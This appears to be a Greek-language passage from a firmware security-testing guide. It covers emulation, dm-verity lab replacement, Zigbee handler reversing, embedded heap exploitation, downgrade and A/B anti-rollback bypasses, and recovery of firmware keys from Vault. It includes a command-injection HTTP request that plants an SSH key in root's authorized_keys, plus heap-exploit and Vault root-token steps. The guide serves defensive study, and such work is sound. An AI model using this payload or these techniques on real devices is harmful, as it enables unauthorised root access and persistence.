Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να γίνει emulation ενός binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian η κατάλληλη επιλογή είναι το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τη χρήση του emulator `qemu-arm` για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την εξομοίωση ολόκληρου του firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystems για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά οι μετατοπίσεις των πινάκων inode, directory ή fragment είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο early boot binary και αναπαραγάγετε το γράφημα block device που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εκθέτουν ένα ονομαστικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με αντιστοίχιση `dm-linear` που προσθέτει sectors δανεισμένα από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους αριθμητικούς υπολογισμούς του firmware. Ειδικότερα, προσδιορίστε αν τα μήκη είναι σε bytes, sectors των 512 byte ή pages των 4 KiB· αναπαραγάγετε τα shifts και τις περικοπές με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από την bank σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα περικόπτει σε όριο 4 KiB και μετά εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, μπορεί να μετακινηθεί το προσαρτημένο extent κατά μερικά kilobytes και να αλλοιωθούν όλοι οι επόμενοι πίνακες SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη ροή εργασιών επικύρωσης είναι:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το binary του verifier/init τη συσκευή προέλευσης, το sector έναρξης και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τα extents χωρίς να αλλάξετε τη σημασιολογία της ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές διαδοχικές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής περιήγηση σε όλους τους καταλόγους και τα fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity ελεγχόμενη από τον αναλυτή

Όταν ο αναλυτής ελέγχει τον QEMU kernel, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του κατασκευαστή με ένα μικρό, στατικά συνδεδεμένο init. Αυτή είναι μια **αντικατάσταση της αλυσίδας εκκίνησης σε lab**, όχι παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού που είναι σφραγισμένο σε TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης θα πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να προσαρτήσει το επεξεργασμένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να εκκινήσει με `execve()` το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την τυχαία αποσύνδεση σημείων προσάρτησης που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε την κατάσταση των μεταβλητών συσκευών ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος virtio δίσκος, προσαρτημένος μόνο για ανάγνωση, παρέχει το επεξεργασμένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης image εκτός σύνδεσης

Επιθεωρήστε την επίμονη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή στην κονσόλα δυσχεραίνουν τον εντοπισμό της αποτυχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιείται από μια εκτελούμενη VM· εκθέστε το με το `qemu-nbd`, περιορίστε την ανακάλυψη LVM στο προβλεπόμενο partition NBD και απενεργοποιήστε το volume group πριν αποσυνδέσετε το volume.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονικές σημάνσεις σε έναν σταθερό τόμο με δυνατότητα εγγραφής και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, FIFO και οι προσωρινές κονσόλες μπορούν να προκαλέσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: το `uname -r` σε σχέση με το `/lib/modules/`, τις δυνατότητες του ext4 στον δίσκο σε σχέση με τη διαμόρφωση του kernel, καθώς και τη γενιά του Mesa `libGL` σε σχέση με το ABI του οδηγού DRI και τα ονόματα οδηγών που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτωθεί επιτυχώς μέσω `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, για την ανάλυση χρησιμοποιείται είτε ένα πραγματικό είτε ένα εξομοιωμένο περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο λειτουργικό σύστημα και στο σύστημα αρχείων. Η εξομοίωση ενδέχεται να μην αναπαράγει τέλεια τις αλληλεπιδράσεις με το υλικό, με αποτέλεσμα να χρειάζονται περιστασιακές επανεκκινήσεις της εξομοίωσης. Η ανάλυση πρέπει να επανεξετάζει το σύστημα αρχείων, να αξιοποιεί εκτεθειμένες ιστοσελίδες και υπηρεσίες δικτύου και να διερευνά ευπάθειες του bootloader. Οι δοκιμές ακεραιότητας του firmware είναι κρίσιμες για τον εντοπισμό πιθανών ευπαθειών backdoor.

## Τεχνικές ανάλυσης κατά τον χρόνο εκτέλεσης

Η ανάλυση κατά τον χρόνο εκτέλεσης περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα δυαδικό αρχείο στο περιβάλλον λειτουργίας του, με χρήση εργαλείων όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για ενσωματωμένους στόχους χωρίς πλήρες debugger, **αντιγράψτε ένα στατικά συνδεδεμένο `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Σε IoT hubs, το RF stack συχνά είναι κατανεμημένο μεταξύ ενός **radio MCU** και μιας διεργασίας userland στο Linux. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **parser στην πλευρά του controller** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, εντοπίστε:

- Τα **message groups** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα τα Zigbee `manufacturer_code` και προσαρμοσμένα `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά το **commissioning**, το discovery ή τις φάσεις λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, γι’ αυτό σημειώστε αν η συσκευή που δοκιμάσατε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και προσβασιμότητα ελεγχόμενη από FSM

Οι vendor-specific εντολές Zigbee/ZCL συχνά αποτελούν καλύτερο στόχο από τα τυποποιημένα clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineer τον command dispatcher μέχρι να εντοπίσετε τον **vendor-only handler**.
- Ανακτήστε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντοπίστε τις **transitional states** που προχωρούν αυτόματα, καθώς και τους κλάδους retry/error που τελικά κάνουν reset ή αποδεσμεύουν state ελεγχόμενο από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέσετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η αναπαραγωγή πακέτων από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι η προσομοίωση μιας νόμιμης συσκευής σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να εκτεθούν τα σωστά **endpoints**, **attributes** και ο χρονισμός του commissioning.

### Κατηγορία σφαλμάτων fragmented-download σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα attacker-controlled **packet-local** πεδία, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο έναντι του **αρχικού μεγέθους της δεσμευμένης μνήμης**.

Αυτό επιτρέπει σε έναν επιτιθέμενο να στείλει:

- Ένα πρώτο έγκυρο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να προκαλέσει μικρή heap allocation.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα παραποιημένο packet-local μέγεθος που περνά τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί υπερχείλιση του αρχικά δεσμευμένου buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής**, ώστε ο στόχος να περάσει στην αναμενόμενη κατάσταση λήψης model ή blob προτού σταλούν τα κακοσχηματισμένα fragments.

### Triggers `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος να προκληθεί heap metadata exploitation συχνά δεν είναι «να περιμένει κανείς το cleanup», αλλά να **εξαναγκάσει τη διαχείριση σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο προσπαθειών, ώστε ο daemon να κάνει **reset context** και να αποδεσμεύσει το κατεστραμμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε allocator-side primitives προτού η διεργασία καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο εναντίον allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **size field**, ώστε η διαδρομή του allocator να κατευθυνθεί σε **fake chunks τοποθετημένα μέσα στο buffer που υπερχείλισε**, αντί να αλλοιωθούν αμέσως πραγματικοί δείκτες bin και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι binary runtime protections είναι σπάνιες σε embedded systems, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (εύλογο μέγεθος, `fd = 0` και γειτονικά chunks που θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Non-PIE binaries υπό ASLR:** αν το ASLR είναι ενεργό, αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` εντός του binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε έναν **function pointer table**.
- **NUL που σταματά τον parser:** κατά την ανάλυση JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας ταυτόχρονα τα bytes που ακολουθούν και ελέγχονται από τον επιτιθέμενο, για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε μια γνωστή mapping και να μεταβεί σε αυτό.

## Προετοιμασμένα λειτουργικά συστήματα για Firmware Analysis

Λειτουργικά συστήματα όπως το [AttifyOS](https://github.com/adi0x90/attifyos) και το [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προρυθμισμένα περιβάλλοντα για δοκιμές ασφάλειας firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Προετοιμασμένα λειτουργικά συστήματα για ανάλυση Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια διανομή που έχει σχεδιαστεί για να σας βοηθήσει να αξιολογείτε την ασφάλεια και να κάνετε penetration testing σε συσκευές Internet of Things (IoT). Εξοικονομεί πολύ χρόνο παρέχοντας ένα προρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Λειτουργικό σύστημα για δοκιμές embedded security, βασισμένο στο Ubuntu 18.04 και προφορτωμένο με εργαλεία δοκιμών ασφάλειας firmware.

## Επιθέσεις υποβάθμισης Firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη κι όταν ένας vendor εφαρμόζει ελέγχους κρυπτογραφικής υπογραφής για τα firmware images, συχνά **παραλείπεται η προστασία από επαναφορά έκδοσης (υποβάθμιση)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, χωρίς να συγκρίνει την *έκδοση* (ή έναν monotonic counter) του image που πρόκειται να εγκατασταθεί, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να έχει έγκυρη υπογραφή**, επαναφέροντας έτσι vulnerabilities που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε ένα παλαιότερο υπογεγραμμένο image**
   * Κατεβάστε το από τη δημόσια πύλη λήψεων του vendor, το CDN ή τον ιστότοπο υποστήριξης.
   * Εξαγάγετέ το από συνοδευτικές εφαρμογές για κινητά ή desktop (π.χ. μέσα από το `assets/firmware/` ενός Android APK).
   * Ανακτήστε το από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Ανεβάστε ή διαθέστε το image στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
   * Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν endpoints HTTP(S) χωρίς authentication, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ενεργοποιούν την ανάκτηση/αναβάθμιση.
3. Μετά την υποβάθμιση, εκμεταλλευτείτε ένα vulnerability που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά το πιο πρόσφατο image ή απενεργοποιήστε τις ενημερώσεις, ώστε να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από υποβάθμιση

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ, την ενεργοποίηση πρόσβασης root μέσω κλειδιών SSH). Σε μεταγενέστερες εκδόσεις firmware προστέθηκε ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από υποβάθμιση καθιστά τη διόρθωση άνευ αποτελέσματος.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί κατασκευαστές ενσωματώνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο από το updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν userspace OTA agent). Αν το **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα partitions ή τα metadata των slot, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα metadata του firmware περιέχουν τόσο έναν περιγραφέα έκδοσης όσο και ένα **security ratchet** / monotonic counter.
- Το updater συγκρίνει το ratchet του image με μια τιμή που είναι αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα image.
- Το bootloader **δεν** διαβάζει αυτό το ratchet και επαληθεύει μόνο την κεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση slot αποθηκεύεται ξεχωριστά σε έναν πίνακα partitions ή σε έναν generation counter ανά slot και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωσης ενός image / εκκίνησης άλλου image** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει το updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image και αργότερα να αντικαταστήσει το slot B πριν από την επανεκκίνηση, το bootloader μπορεί και πάλι να εκκινήσει το downgraded image, επειδή εμπιστεύεται μόνο τα ήδη αποθηκευμένα metadata του slot.

Συνηθισμένο μοτίβο κατάχρησης:

1. Ανεβάστε ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε επανεκκίνηση ακόμη**. Εκτελέστε ξανά τη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλευτείτε παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε το updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήχθη.
4. Γράψτε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παραλείψτε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάντε απευθείας επανεκκίνηση.
6. Το bootloader επιλέγει το προαχθέν slot, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Σημεία που πρέπει να αναζητήσετε κατά το reverse engineering υλοποιήσεων A/B update:

- Επιλογή slot βάσει **boot-time flags** που δεν ανανεώνονται μετά από επιτυχή εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot βάσει παρωχημένης κατάστασης αντί για την **τρέχουσα αποθηκευμένη διάταξη**.
- Συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / ενεργή σημαία και δεν αποθηκεύει το hash του επικυρωμένου image.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο, ακόμη κι αφού το περιεχόμενό του διαγραφεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση της λογικής update

* Προστατεύονται επαρκώς η μεταφορά και η authentication του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε μια αλυσίδα secure boot (π.χ. ελέγχονται οι υπογραφές από κώδικα ROM);
* Επιβάλλει το **bootloader το ίδιο ratchet** με το updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης slot **δεσμευμένα στο επικυρωμένο firmware digest/έκδοση**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχή εναλλαγή slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες μεταγενέστερες ρουτίνες update/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους εγκυρότητας (π.χ. επιτρεπόμενος χάρτης partitions, αριθμός μοντέλου);
* Χρησιμοποιούν οι *partial* ή *backup* ροές update την ίδια λογική επικύρωσης;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στον εντοπισμό ευπαθειών σε firmware, χρησιμοποιήστε τα παρακάτω ευάλωτα projects firmware ως αφετηρία.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα update image συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε διαλογή του container πριν επιχειρήσετε brute-force:<sup>[[1]](#references)</sup>

- Αποτυπώστε τις κεφαλίδες, τα offsets και τα όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι το ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περικλείει έναν τυχαίο κωδικό πρόσβασης/κλειδί συνεδρίας firmware.
- Τα αποσπασμένα δεδομένα PGP στο ίδιο αρχείο συχνά προστατεύουν μόνο την αυθεντικότητα· μην υποθέτετε ότι αποτελούν τον μηχανισμό εμπιστευτικότητας.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάντε reverse engineering στη **λειτουργική διαδρομή αποκρυπτογράφησης** αντί να ψάχνετε μόνο για private keys:

- Κάντε decompile το updater / management binary και ακολουθήστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το ξετυλίγει και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και unit files και init scripts.
- Αντιμετωπίστε εντολές `vault operator unseal ...` σε plaintext, recovery keys, bootstrap tokens ή τοπικά scripts auto-unseal του KMS ως ισοδύναμα με υλικό private key.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το storage backend, η αναπαραγωγή εκείνου του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
